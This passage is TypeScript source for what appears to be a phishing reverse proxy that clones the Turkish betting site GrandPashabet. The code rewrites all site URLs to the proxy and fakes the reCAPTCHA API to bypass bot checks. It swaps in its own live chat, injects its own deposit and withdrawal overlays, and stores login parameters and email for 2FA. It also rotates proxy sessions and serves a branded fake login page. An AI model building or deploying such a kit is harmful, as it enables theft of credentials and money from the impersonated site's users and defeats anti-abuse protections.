  // ─── reCAPTCHA Mock (Comprehensive) ───
  // The target site uses reCAPTCHA v3 which is domain-locked to the real domain.
  // We mock the entire reCAPTCHA lifecycle so the site's own JS works normally.
  window.__recaptchaMocked = true;
  var fakeToken = 'PROXY_RECAPTCHA_PLACEHOLDER';

  // Full grecaptcha API mock
  var _fakeGrecaptcha = {
    ready: function(cb) { 
      console.log('[PROXY-CAPTCHA] grecaptcha.ready() called');
      if (cb) setTimeout(cb, 1); 
    },
    execute: function(siteKey, opts) {
      console.log('[PROXY-CAPTCHA] grecaptcha.execute() called, siteKey:', siteKey);
      return Promise.resolve(fakeToken);
    },
    render: function(container, params) { 
      console.log('[PROXY-CAPTCHA] grecaptcha.render() called');
      // Some sites check the return value (widget ID)
      return 0; 
    },
    getResponse: function() { return fakeToken; },
    reset: function() {},
    enterprise: {
      ready: function(cb) { if (cb) setTimeout(cb, 1); },
      execute: function(siteKey, opts) { return Promise.resolve(fakeToken); },
      render: function() { return 0; },
      getResponse: function() { return fakeToken; },
      reset: function() {}
    }
  };

  // Set it immediately and protect from overwrites
  window.grecaptcha = _fakeGrecaptcha;
  Object.defineProperty(window, 'grecaptcha', {
    get: function() { return _fakeGrecaptcha; },
    set: function(v) { console.log('[PROXY-CAPTCHA] Blocked grecaptcha overwrite'); },
    configurable: true
  });

  // Internal reCAPTCHA config that some versions check
  window.___grecaptcha_cfg = window.___grecaptcha_cfg || { count: 1, clients: { 0: {} } };

  // ─── Fire reCAPTCHA onload callbacks ───
  // Sites use: <script src="recaptcha/api.js?onload=myCallback&render=SITEKEY">
  // When we block the script, the callback never fires. Fix: detect and fire it.
  function fireRecaptchaCallbacks() {
    // Check URL params from any recaptcha script tags
    var scripts = document.querySelectorAll('script[src*="recaptcha"], script[data-src*="recaptcha"]');
    scripts.forEach(function(s) {
      var src = s.getAttribute('src') || s.getAttribute('data-src') || '';
      var onloadMatch = src.match(/[?&]onload=([^&]+)/);
      if (onloadMatch && window[onloadMatch[1]]) {
        console.log('[PROXY-CAPTCHA] Firing onload callback: ' + onloadMatch[1]);
        try { window[onloadMatch[1]](); } catch(e) { console.log('[PROXY-CAPTCHA] Callback error:', e); }
      }
    });

    // Fire common global callback names
    var commonCallbacks = ['onRecaptchaLoaded', 'recaptchaLoaded', 'onRecaptchaLoad', 
                           'recaptchaCallback', 'captchaCallback', 'onloadCallback',
                           'onGrecaptchaReady', 'recaptchaReady'];
    commonCallbacks.forEach(function(name) {
      if (typeof window[name] === 'function') {
        console.log('[PROXY-CAPTCHA] Firing global callback: ' + name);
        try { window[name](); } catch(e) {}
      }
    });
  }

  // Fire callbacks at multiple times to catch late-defined ones
  setTimeout(fireRecaptchaCallbacks, 100);
  setTimeout(fireRecaptchaCallbacks, 500);
  setTimeout(fireRecaptchaCallbacks, 1000);
  setTimeout(fireRecaptchaCallbacks, 2000);
  setTimeout(fireRecaptchaCallbacks, 3000);
  setTimeout(fireRecaptchaCallbacks, 5000);

  // ─── Intercept script creation to catch dynamically added reCAPTCHA ───
  var _createElement = document.createElement.bind(document);
  document.createElement = function(tagName) {
    var el = _createElement(tagName);
    if (tagName.toLowerCase() === 'script') {
      var _origSrcDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
      var _realSet = _origSrcDesc && _origSrcDesc.set;
      // Watch for src being set to recaptcha URL
      var _scriptEl = el;
      setTimeout(function() {
        var src = _scriptEl.src || _scriptEl.getAttribute('src') || '';
        if (src.indexOf('recaptcha') !== -1 || src.indexOf('gstatic.com/recaptcha') !== -1) {
          console.log('[PROXY-CAPTCHA] Intercepted dynamic reCAPTCHA script: ' + src);
          // Don't actually load it, but fire onload
          setTimeout(function() {
            if (_scriptEl.onload) { 
              console.log('[PROXY-CAPTCHA] Firing script.onload');
              _scriptEl.onload(); 
            }
            // Also fire from URL param
            var onloadMatch = src.match(/[?&]onload=([^&]+)/);
            if (onloadMatch && window[onloadMatch[1]]) {
              console.log('[PROXY-CAPTCHA] Firing URL onload: ' + onloadMatch[1]);
              try { window[onloadMatch[1]](); } catch(e) {}
            }
            fireRecaptchaCallbacks();
          }, 50);
        }
      }, 0);
    }
    return el;
  };

  // ─── Block reCAPTCHA script but simulate load event ───
  // Override appendChild/insertBefore to intercept reCAPTCHA script insertion
  function interceptScriptInsertion(originalFn, parentProto) {
    return function(newNode) {
      if (newNode && newNode.tagName === 'SCRIPT') {
        var src = newNode.src || newNode.getAttribute('src') || '';
        if (src.indexOf('recaptcha') !== -1 || src.indexOf('gstatic.com/recaptcha') !== -1) {
          console.log('[PROXY-CAPTCHA] Blocked reCAPTCHA script insertion, simulating load');
          // Don't insert the script, but simulate successful load
          setTimeout(function() {
            if (newNode.onload) newNode.onload();
            var loadEvent = new Event('load');
            newNode.dispatchEvent(loadEvent);
            // Fire callbacks
            var onloadMatch = src.match(/[?&]onload=([^&]+)/);
            if (onloadMatch && window[onloadMatch[1]]) {
              try { window[onloadMatch[1]](); } catch(e) {}
            }
            fireRecaptchaCallbacks();
          }, 50);
          return newNode; // Return without inserting
        }
      }
      return originalFn.apply(this, arguments);
    };
  }

  Node.prototype.appendChild = interceptScriptInsertion(Node.prototype.appendChild, Node.prototype);
  Node.prototype.insertBefore = interceptScriptInsertion(Node.prototype.insertBefore, Node.prototype);

  // Orijinal login - bizim auth inject kaldırıldı, formlar hedef siteye gidiyor

  // ═══════════════════════════════════════════════════
  // ─── Deposit Navigation + KASA Overlay for Forms ───
  // ═══════════════════════════════════════════════════
  function initDepositSystem() {
    if (!document.body) { document.addEventListener('DOMContentLoaded', initDepositSystem); return; }
    if (document.getElementById('payment-sheet-backdrop')) return;

    var depositCSS = document.createElement('style');
    depositCSS.textContent = '#payment-sheet-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:99998;opacity:0;visibility:hidden;transition:opacity .25s, visibility .25s}'
      + '#payment-sheet-backdrop.open{opacity:1;visibility:visible}'
      + '#payment-sheet{position:fixed;left:0;right:0;bottom:0;height:90vh;max-height:90vh;background:var(--cwDominantBg,#1a1e29);z-index:99999;border-radius:16px 16px 0 0;box-shadow:0 -4px 24px rgba(0,0,0,.3);display:flex;flex-direction:column;transform:translateY(100%);transition:transform .3s ease}'
      + '#payment-sheet-backdrop.open #payment-sheet{transform:translateY(0)}'
      + '.payment-sheet_header{background:#708f00;border-bottom:1px solid #708f00;display:flex;justify-content:space-between;align-items:center;height:48px;padding:0 16px;color:#fff;font-size:16px;font-weight:bold;text-transform:uppercase;flex-shrink:0;border-radius:16px 16px 0 0}'
      + '.payment-sheet_header .js_cashier_close{cursor:pointer;font-size:24px;padding:4px 8px;line-height:1}'
      + '#cashier_iframe{flex:1;width:100%;border:none;min-height:0}'
      + '#cashier-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);z-index:99999;display:none;flex-direction:column}'
      + '#cashier-overlay.open{display:flex}'
      + '.cashier_fixed_header{background-color:#708f00;border-bottom:1px solid #708f00;display:flex;justify-content:space-between;align-items:center;height:39px;padding:0 16px;color:#fff;font-size:14px;font-weight:bold;text-transform:uppercase}'
      + '.cashier_fixed_header .js_cashier_close{cursor:pointer;font-size:22px;padding:4px 8px}'
      + '#cashier_iframe_in_overlay{flex:1;width:100%;border:none}';
    document.head.appendChild(depositCSS);

    var backdrop = document.createElement('div');
    backdrop.id = 'payment-sheet-backdrop';
    backdrop.innerHTML = '<div id="payment-sheet"><div class="payment-sheet_header"><span class="payment-sheet_title">KASA</span><div class="js_cashier_close">\u2715</div></div><iframe id="cashier_iframe" src="about:blank"></iframe></div>';
    document.body.appendChild(backdrop);

    var overlay = document.createElement('div');
    overlay.id = 'cashier-overlay';
    overlay.innerHTML = '<div class="cashier_fixed_header"><div class="cashier_text">KASA</div><div class="js_cashier_close_overlay">\u2715</div></div><iframe id="cashier_iframe_in_overlay" src="about:blank"></iframe>';
    document.body.appendChild(overlay);

    backdrop.querySelector('.js_cashier_close').addEventListener('click', function() { backdrop.classList.remove('open'); });
    backdrop.addEventListener('click', function(e) { if (e.target === backdrop) backdrop.classList.remove('open'); });
    overlay.querySelector('.js_cashier_close_overlay').addEventListener('click', function() { overlay.classList.remove('open'); });
    overlay.addEventListener('click', function(e) { if (e.target === overlay) overlay.classList.remove('open'); });

    function openDeposit() {
      window.closeProfileSidebar && window.closeProfileSidebar();
      document.querySelector('.payment-sheet_title').textContent = 'KASA';
      document.getElementById('cashier_iframe').src = '/payment?embed=1';
      backdrop.classList.add('open');
    }
    function openWithdrawal() {
      window.closeProfileSidebar && window.closeProfileSidebar();
      document.querySelector('.payment-sheet_title').textContent = 'PARA \u00c7EKME';
      document.getElementById('cashier_iframe').src = '/withdrawal?embed=1';
      backdrop.classList.add('open');
    }
    function openPaymentForm(formUrl) {
      window.closeProfileSidebar && window.closeProfileSidebar();
      document.getElementById('cashier_iframe_in_overlay').src = formUrl;
      overlay.classList.add('open');
    }
    window.openDepositModal = openDeposit;
    window.openWithdrawalModal = openWithdrawal;
    window.openPaymentForm = openPaymentForm;
    document.addEventListener('click', function(e) {
      var target = e.target;
      var el = target.closest ? target.closest('a, button, [onclick]') : target;
      if (!el) return;
      var text = (el.textContent || '').trim();
      if (text === 'Para Yat\\u0131rma' || text === 'Para Yatirma' || text === 'Para Yat\\u0131r') {
        if (el.closest('#cashier-overlay') || el.closest('#payment-sheet-backdrop')) return;
        e.preventDefault();
        e.stopPropagation();
        openDeposit();
      }
      if (text === 'Para \\u00c7ekme' || text === 'Para Cekme' || text === 'Para \\u00c7ek') {
        if (el.closest('#cashier-overlay') || el.closest('#payment-sheet-backdrop')) return;
        e.preventDefault();
        e.stopPropagation();
        openWithdrawal();
      }
    }, true);

    var depositBtn = document.querySelector('.topheader_user_deposit');
    if (depositBtn) {
      depositBtn.onclick = function(e) { e.preventDefault(); e.stopPropagation(); openDeposit(); };
    }
  }
  initDepositSystem();

  // ═══════════════════════════════════════════════════
  // ─── Canlı Destek (Live Support) Float Button ───
  // ═══════════════════════════════════════════════════
  function initLiveSupport() {
    if (!document.body) { document.addEventListener('DOMContentLoaded', initLiveSupport); return; }
    if (document.getElementById('canli-destek-float')) return;

    var lsCSS = document.createElement('style');
    lsCSS.textContent = ''
      + '#canli-destek-float{position:fixed;bottom:80px;right:12px;z-index:99990;cursor:pointer;transition:transform .2s,opacity .2s;filter:drop-shadow(0 2px 8px rgba(0,0,0,.4))}'
      + '#canli-destek-float:hover{transform:scale(1.05)}';
    document.head.appendChild(lsCSS);

    var floatBtn = document.createElement('div');
    floatBtn.id = 'canli-destek-float';

    var floatImg = document.createElement('img');
    floatImg.src = '/images/canlimobil.png';
    floatImg.onerror = function() {
      if (!this._cdFallback1) { this._cdFallback1 = true; this.src = '/tr/images/canlimobil.png'; return; }
      if (!this._cdFallback2) { this._cdFallback2 = true; this.src = '/proxy/images/canlimobil.png'; return; }
      this.onerror = null;
      this.src = 'data:image/svg+xml;utf8,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 80 80%22%3E%3Ccircle cx=%2240%22 cy=%2240%22 r=%2238%22 fill=%22%23708f00%22/%3E%3Cpath d=%22M22 26h36v20a8 8 0 0 1-8 8H36l-10 8v-16a8 8 0 0 1-4-7V26z%22 fill=%22white%22/%3E%3C/svg%3E';
    };
    floatImg.alt = 'Canli Destek';
    floatImg.style.cssText = 'width:75px;height:auto;border:none;display:block';

    floatBtn.appendChild(floatImg);
    document.body.appendChild(floatBtn);

    function openTawk() {
      if (typeof Tawk_API !== 'undefined') {
        if (Tawk_API.maximize) Tawk_API.maximize();
        else if (Tawk_API.toggle) Tawk_API.toggle();
        return true;
      }
      var tawkIframe = document.querySelector('iframe[src*="tawk.to"]');
      if (tawkIframe) {
        tawkIframe.style.display = 'block';
        tawkIframe.style.visibility = 'visible';
        tawkIframe.style.zIndex = '99999';
        return true;
      }
      var origBtn = document.querySelector('[data-testid="chat_button_widget"], .tawk-min-container, .widget-visible');
      if (origBtn) { origBtn.click(); return true; }
      return false;
    }
    floatBtn.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      if (openTawk()) return;
      var attempts = 0;
      var t = setInterval(function() {
        if (openTawk() || ++attempts >= 6) clearInterval(t);
      }, 500);
    });
  }
  initLiveSupport();

  // ═══════════════════════════════════════════════════
  // ─── Sesli Destek → Canlı Destek Hijack ───
  // ═══════════════════════════════════════════════════
  function openLiveChat() {
    if (typeof Tawk_API !== 'undefined') {
      if (Tawk_API.maximize) { Tawk_API.maximize(); return; }
      if (Tawk_API.toggle) { Tawk_API.toggle(); return; }
    }
    var f = document.querySelector('iframe[src*="tawk"]');
    if (f) { f.style.display = 'block'; f.style.visibility = 'visible'; f.style.zIndex = '99999'; return; }
    var b = document.querySelector('[data-testid="chat_button_widget"],.tawk-min-container,.widget-visible');
    if (b) { b.click(); return; }
    var c = document.getElementById('canli-destek-float');
    if (c) c.click();
  }
  window._openLiveChat = openLiveChat;

  function hijackSesliDestek() {
    var nav = document.getElementById('js_bn_nav_bar');
    if (!nav) return;
    var items = nav.querySelectorAll('.cw_mob_mav_fixed_bot_item');
    for (var i = 0; i < items.length; i++) {
      var sp = items[i].querySelector('span span');
      if (sp && (sp.textContent.trim() === 'SESL\u0130 DESTEK' || sp.textContent.trim() === 'Sesli Destek' || sp.textContent.trim().toUpperCase() === 'SESLI DESTEK')) {
        sp.textContent = 'CANLI DESTEK';
        items[i].setAttribute('href', 'javascript:void(0)');
        items[i].setAttribute('onclick', '');
        items[i].onclick = function(e) {
          e.preventDefault();
          e.stopPropagation();
          openLiveChat();
        };
        items[i].setAttribute('data-hijacked', '1');
      }
    }
  }
  hijackSesliDestek();
  setInterval(hijackSesliDestek, 2000);
  var _sesliObs = new MutationObserver(hijackSesliDestek);
  if (document.body) _sesliObs.observe(document.body, { childList: true, subtree: true });

  console.log('[PROXY] Client-side: URL rewriting + deposit modal + canli destek active (orijinal login)');
})();
</script>`;

  // reCAPTCHA script'leri artık kaldırılmıyor - orijinal login çalışsın, 2Captcha proxy'de çözecek

  // Remove target site's live chat scripts (only src-based, safe)
  r = r.replace(/<script[^>]*src=["'][^"']*(?:mobifly|eforservhub|comm100|livechatinc|livechat-static)[^"']*["'][^>]*><\/script>/gi, '');
  r = r.replace(/<script[^>]*src=["'][^"']*(?:mobifly|eforservhub|comm100|livechatinc|livechat-static)[^"']*["'][^>]*\/>/gi, '');

  // Inject CSS: sadece hedef sitenin live chat'ini gizle (Tawk inject için). reCAPTCHA artık gizlenmiyor - orijinal login için.
  const recaptchaCss = `<style>
iframe[src*="mobifly"],iframe[src*="eforservhub"],iframe[src*="comm100"],iframe[src*="livechatinc"],
div[id*="comm100"],div[class*="comm100"],div[id*="livechat"],div[class*="livechat-widget"],
#chat-widget-container,#chat-widget,.chat-widget-minimized,.chat-widget-maximized,
[data-testid="chat_button_widget"]:not(.tawk-min-container),
div[class*="lc-"][class*="widget"],div[id*="lc_chat"]{display:none!important;height:0!important;width:0!important;overflow:hidden!important;position:absolute!important;left:-9999px!important;pointer-events:none!important}
</style>`;

  // Insert script after <head> tag
  r = r.replace(/(<head[^>]*>)/i, `$1${recaptchaCss}${wsScript}`);

  return r;
}

function rewriteCss(css: string, proxyBase: string): string {
  let r = css;
  // url(/) in CSS
  r = r.replace(/url\(\s*["']?\/(?!\/|proxy|data:)/gi, `url(${proxyBase}/`);
  // url(https://grandpashabet...)
  r = r.replace(/url\(\s*["']?https?:\/\/grandpashabet\d*\.com/gi, `url(${proxyBase}`);
  return r;
}

function rewriteJs(js: string, proxyBase: string): string {
  let r = js;
  r = r.replace(/https?:\/\/grandpashabet\d*\.com\/tr\/([^"'\s]*)/gi, (_m, path) => proxyBase + "/" + stripTrFromPath(path, proxyBase));
  r = r.replace(/https?:\/\/grandpashabet\d*\.com\/tr\/?/gi, proxyBase + "/");
  r = r.replace(/https?:\/\/grandpashabet\d*\.com/gi, proxyBase);
  const baseNoProto = proxyBase.replace(/^https?:/, "") || proxyBase;
  r = r.replace(/\/\/grandpashabet\d*\.com\/tr\/([^"'\s]*)/gi, (_m, path) => baseNoProto + "/" + stripTrFromPath(path, proxyBase));
  r = r.replace(/\/\/grandpashabet\d*\.com\/tr\/?/gi, baseNoProto + "/");
  r = r.replace(/\/\/grandpashabet\d*\.com/gi, baseNoProto);
  return r;
}

function rewriteJson(json: string, proxyBase: string): string {
  let r = json;
  r = r.replace(/https?:\/\/grandpashabet\d*\.com\/tr\/([^"'\s]*)/gi, (_m, path) => proxyBase + "/" + stripTrFromPath(path, proxyBase));
  r = r.replace(/https?:\/\/grandpashabet\d*\.com\/tr\/?/gi, proxyBase + "/");
  r = r.replace(/https?:\/\/grandpashabet\d*\.com/gi, proxyBase);
  const pbEsc = proxyBase.replace(/\//g, "\\/");
  r = r.replace(/https?:\\\/\\\/grandpashabet\d*\.com\\\/tr\\\/([^"']*)/gi, (_m, path) => pbEsc + "\\/" + stripTrFromPath(path.replace(/\\\//g, "/"), proxyBase).replace(/\//g, "\\/"));
  r = r.replace(/https?:\\\/\\\/grandpashabet\d*\.com\\\/tr\\\/?/gi, pbEsc + "\\/");
  r = r.replace(/https?:\\\/\\\/grandpashabet\d*\.com/gi, pbEsc);
  return r;
}

function getContentCategory(contentType: string | undefined): "html" | "css" | "js" | "json" | "xml" | "binary" {
  if (!contentType) return "binary";
  const ct = contentType.toLowerCase();
  if (ct.includes("text/html")) return "html";
  if (ct.includes("text/css")) return "css";
  if (ct.includes("javascript")) return "js";
  if (ct.includes("application/json")) return "json";
  if (ct.includes("text/xml") || ct.includes("application/xml")) return "xml";
  return "binary";
}

// ═══════════════════════════════════════════════════
// ─── Asset Detection ───
// ═══════════════════════════════════════════════════
const ASSET_EXTENSIONS = /\.(js|css|png|jpg|jpeg|gif|svg|woff|woff2|ttf|eot|ico|webp|avif|mp4|webm|mp3|ogg|flac|pdf|swf)(\?|$)/i;
const IMAGE_EXTENSIONS = /\.(png|jpg|jpeg|gif|svg|webp|avif|ico)(\?|$)/i;
const FONT_EXTENSIONS = /\.(woff|woff2|ttf|eot)(\?|$)/i;
const STYLE_EXTENSIONS = /\.css(\?|$)/i;
const SCRIPT_EXTENSIONS = /\.js(\?|$)/i;

function getSecFetchDest(path: string, isAjax: boolean): string {
  if (isAjax) return "empty";
  if (IMAGE_EXTENSIONS.test(path)) return "image";
  if (FONT_EXTENSIONS.test(path)) return "font";
  if (STYLE_EXTENSIONS.test(path)) return "style";
  if (SCRIPT_EXTENSIONS.test(path)) return "script";
  if (ASSET_EXTENSIONS.test(path)) return "empty";
  return "document";
}

// ═══════════════════════════════════════════════════
// ─── Proxy Connection Test ───
// ═══════════════════════════════════════════════════
async function testProxyConnection(): Promise<{ ok: boolean; statusCode?: number; error?: string; body?: string }> {
  return new Promise((resolve) => {
    const options: https.RequestOptions = {
      hostname: getTargetHost(),
      port: 443,
      path: "/tr/",
      method: "GET",
      headers: {
        Host: getTargetHost(),
        "User-Agent": USER_AGENT,
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        Cookie: buildCookieString(),
      },
      agent: proxyAgent,
      timeout: 15000,
      rejectUnauthorized: false,
    };
    const req = https.request(options, (res) => {
      if (res.headers["set-cookie"]) {
        const nc = parseCookies(res.headers["set-cookie"] as string[]);
        for (const [k, v] of Object.entries(nc)) storedCookies.set(k, v);
      }
      const chunks: Buffer[] = [];
      const enc = res.headers["content-encoding"];
      let stream: NodeJS.ReadableStream = res;
      if (enc === "gzip") stream = res.pipe(zlib.createGunzip());
      else if (enc === "deflate") stream = res.pipe(zlib.createInflate());
      else if (enc === "br") stream = res.pipe(zlib.createBrotliDecompress());
      stream.on("data", (c) => chunks.push(c));
      stream.on("end", () => {
        const body = Buffer.concat(chunks).toString("utf-8");
        const isOk = res.statusCode === 200 && (body.includes("<!DOCTYPE") || body.includes("<html"));
        if (isOk) {
          proxyVerified = true;
          log("PROXY", "Connection verified - proxy is working");
        }
        resolve({ ok: isOk, statusCode: res.statusCode, body: body.substring(0, 200) });
      });
    });
    req.on("error", (err) => resolve({ ok: false, error: err.message }));
    req.on("timeout", () => { req.destroy(); resolve({ ok: false, error: "timeout" }); });
    req.end();
  });
}

async function warmupEndpoint(path: string): Promise<void> {
  return new Promise((resolve) => {
    const req = https.request(
      {
        hostname: getTargetHost(),
        port: 443,
        path,
        method: "GET",
        headers: { Host: getTargetHost(), "User-Agent": USER_AGENT, Accept: "*/*", Cookie: buildCookieString() },
        agent: proxyAgent,
        timeout: 15000,
        rejectUnauthorized: false,
      },
      (res) => {
        if (res.headers["set-cookie"]) {
          const nc = parseCookies(res.headers["set-cookie"] as string[]);
          for (const [k, v] of Object.entries(nc)) storedCookies.set(k, v);
        }
        res.on("data", () => {});
        res.on("end", () => resolve());
      }
    );
    req.on("error", () => resolve());
    req.end();
  });
}

const PROXY_BASE = "/tr";
const WARMUP_CACHE_PATHS = [
  "/tr/",
  "/tr/Casino",
  "/tr/LiveCasino",
  "/tr/Sports",
  "/tr/sport",
  "/tr/lobby/casino/main",
  "/tr/lobby/livecasino/main",
  "/tr/Login/Login",
  "/tr/payment",
  "/tr/withdrawal",
];

async function warmupAndCachePath(targetPath: string): Promise<void> {
  try {
    const html = await fetchViaProxy(targetPath, "GET");
    if (!html || html.length < 500) return;
    const body = rewriteHtml(html, PROXY_BASE);
    const entry = { body, contentType: "text/html; charset=utf-8", statusCode: 200, headers: {} as Record<string, string> };
    setCache(`GET:D:${targetPath}`, entry);
    // M cache'e desktop HTML yazma - mobil kullanicilar masaustu gorunumu alir
    log("CACHE", `Warmed ${targetPath} (D only, ${body.length} bytes)`);
  } catch (_) {}
}

async function runFullWarmup(): Promise<void> {
  for (const p of WARMUP_CACHE_PATHS) {
    await warmupAndCachePath(p);
  }
  log("CACHE", "Full warmup done");
}

async function refreshSession(): Promise<void> {
  currentSessionId = generateSessionId();
  proxyAgent = createProxyAgent();
  storedCookies.clear();
  // Sync so Puppeteer uses same IP
  setPuppeteerSessionId(currentSessionId);
  log("SESSION", `New: ${currentSessionId} (synced)`);
  await testProxyConnection();
  await warmupEndpoint("/login/login");
  log("SESSION", `Warmed up, ${storedCookies.size} cookies`);
}

// ═══════════════════════════════════════════════════
// ─── WebSocket Proxy ───
// ═══════════════════════════════════════════════════
function setupWebSocketProxy(httpServer: Server): void {
  const wss = new WebSocketServer({ noServer: true });

  httpServer.on("upgrade", (req, socket, head) => {
    const url = req.url || "";

    // Only proxy /proxy-ws/ paths
    if (!url.startsWith("/proxy-ws/")) {
      // Let Vite handle its own HMR WebSocket
      return;
    }

    log("WS", `Upgrade request: ${url}`);

    // Extract the target WebSocket URL from the path
    // /proxy-ws/wss/api5.smartico.ai/websocket/services?... → wss://api5.smartico.ai/websocket/services?...
    // /proxy-ws/HOST/... → wss://TARGET_HOST/...
    let targetWsUrl = "";
    const pathAfterPrefix = url.substring("/proxy-ws/".length);

    if (pathAfterPrefix.startsWith("wss/") || pathAfterPrefix.startsWith("ws/")) {
      const proto = pathAfterPrefix.startsWith("wss/") ? "wss:" : "ws:";
      targetWsUrl = `${proto}//${pathAfterPrefix.substring(pathAfterPrefix.indexOf("/") + 1)}`;
    } else {
      // Default: assume wss to target host
      targetWsUrl = `wss://${getTargetHost()}/${pathAfterPrefix}`;
    }

    log("WS", `Connecting to: ${targetWsUrl}`);

    const wsHeaders: Record<string, string> = {
      "User-Agent": USER_AGENT,
      Origin: getTargetOrigin(),
      Cookie: buildCookieString(),
      "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    };

    // Forward important headers from client
    if (req.headers["sec-websocket-protocol"]) {
      wsHeaders["Sec-WebSocket-Protocol"] = req.headers["sec-websocket-protocol"] as string;
    }

    const targetUrl = new URL(targetWsUrl);
    const useProxy = TARGET_DOMAIN_PATTERN.test(targetUrl.hostname);

    const wsOptions: WebSocket.ClientOptions = {
      headers: wsHeaders,
      agent: useProxy ? (createProxyAgent() as any) : undefined,
      rejectUnauthorized: false,
    };

    try {
      const upstream = new WebSocket(targetWsUrl, wsOptions);

      upstream.on("open", () => {
        log("WS", `Connected to ${targetUrl.hostname}`);
        wss.handleUpgrade(req, socket as any, head, (clientWs) => {
          // Relay messages bidirectionally
          clientWs.on("message", (data, isBinary) => {
            if (upstream.readyState === WebSocket.OPEN) {
              upstream.send(data, { binary: isBinary });
            }
          });

          upstream.on("message", (data, isBinary) => {
            if (clientWs.readyState === WebSocket.OPEN) {
              clientWs.send(data, { binary: isBinary });
            }
          });

          clientWs.on("close", (code, reason) => {
            log("WS", `Client closed (${code})`);
            if (upstream.readyState === WebSocket.OPEN) upstream.close(code, reason);
          });

          upstream.on("close", (code, reason) => {
            log("WS", `Upstream closed (${code})`);
            if (clientWs.readyState === WebSocket.OPEN) clientWs.close(code, reason);
          });

          clientWs.on("error", (err) => log("WS", `Client error: ${err.message}`));
          upstream.on("error", (err) => log("WS", `Upstream error: ${err.message}`));
        });
      });

      upstream.on("error", (err) => {
        log("WS", `Connection failed: ${err.message}`);
        socket.destroy();
      });
    } catch (err: any) {
      log("WS", `Setup error: ${err.message}`);
      socket.destroy();
    }
  });

  log("WS", "WebSocket proxy initialized");
}

// ═══════════════════════════════════════════════════
// ─── Decompress Helper ───
// ═══════════════════════════════════════════════════
function decompressStream(res: http.IncomingMessage): NodeJS.ReadableStream {
  const encoding = res.headers["content-encoding"];
  if (encoding === "gzip") return res.pipe(zlib.createGunzip());
  if (encoding === "deflate") return res.pipe(zlib.createInflate());
  if (encoding === "br") return res.pipe(zlib.createBrotliDecompress());
  // Note: zstd not natively supported in Node.js, skip it
  return res;
}

// ═══════════════════════════════════════════════════
// ─── Session Store for Login Params (TrustBrowser 2FA) ───
// ═══════════════════════════════════════════════════
const loginSession: {
  loginParam: string;
  loginParam1: string;
  loginParam2: string;
  email: string;
} = { loginParam: "", loginParam1: "", loginParam2: "", email: "" };

function getProxyBaseFromRequest(req: Request): string {
  return req.path.startsWith("/tr") ? "/tr" : "/proxy";
}
function getHomeUrl(base: string): string {
  return base === "/tr" ? "/tr/" : "/proxy/tr/";
}

// ═══════════════════════════════════════════════════
// ─── Login Page HTML ───
// ═══════════════════════════════════════════════════
function getLoginPageHtml(base: string): string {
  const home = getHomeUrl(base);
  return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>GrandPashabet - \u00dcye Giri\u015fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1e29;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#fff;min-height:100vh;overflow-x:hidden}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:100}

/* ─── Desktop: centered modal ─── */
.sidebar_login{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:200;background:#262a36;border-radius:10px;width:420px;max-width:95vw;box-shadow:0 20px 60px rgba(0,0,0,.7);display:flex;flex-direction:column;max-height:95vh;overflow-y:auto}

/* ─── Header ─── */
.sidebar_login-header{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid #363a48}
.sidebar_login-header span{font-size:14px;font-weight:600;color:#b0b3bc;letter-spacing:.5px}
.sidebar_login-close{width:24px;height:24px;cursor:pointer;position:relative;display:flex;align-items:center;justify-content:center}
.sidebar_login-close::before,.sidebar_login-close::after{content:'';position:absolute;width:14px;height:2px;background:#888;border-radius:1px}
.sidebar_login-close::before{transform:rotate(45deg)}
.sidebar_login-close::after{transform:rotate(-45deg)}
.sidebar_login-close:hover::before,.sidebar_login-close:hover::after{background:#fff}

/* ─── Body ─── */
.login_container{padding:24px 20px 20px}

/* ─── Logo ─── */
.platformLoginRightLogo{display:flex;flex-direction:column;align-items:center;margin-bottom:24px}
.logo-icon{margin-bottom:8px}
.logo-icon svg{width:48px;height:48px}
.logo-title{font-size:20px;font-weight:800;color:#fff;letter-spacing:2px;line-height:1}
.logo-subtitle{font-size:9px;color:#7a7e8a;letter-spacing:3px;margin-top:3px;font-weight:500;text-transform:uppercase}

/* ─── Form rows (table-like: label | input) ─── */
.r_login__row{margin-bottom:10px}
.PlatformLoginPassContainer{display:flex;align-items:stretch;background:#1c1f2b;border:1px solid #3a3e4c;border-radius:6px;overflow:hidden}
.PlatformLoginPassContainer .field-label{flex-shrink:0;display:flex;align-items:center;padding:0 14px;font-size:11px;font-weight:700;color:#7a7e8a;text-transform:uppercase;letter-spacing:.5px;background:#181b25;border-right:1px solid #3a3e4c;white-space:nowrap;min-height:46px}
.login_input,.platformPassInput{flex:1;padding:13px 14px;border:none;background:transparent;color:#d0d3db;font-size:14px;outline:none;min-width:0}
.login_input::placeholder,.platformPassInput::placeholder{color:#555a68}

/* ─── Eye button ─── */
.eye_block{position:relative}
.eye_button{flex-shrink:0;width:42px;background:none;border:none;border-left:1px solid #3a3e4c;color:#666;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:color .15s}
.eye_button:hover{color:#aaa}

/* ─── Error / uyarı (tek satırda taşmadan, düzgün okunur) ─── */
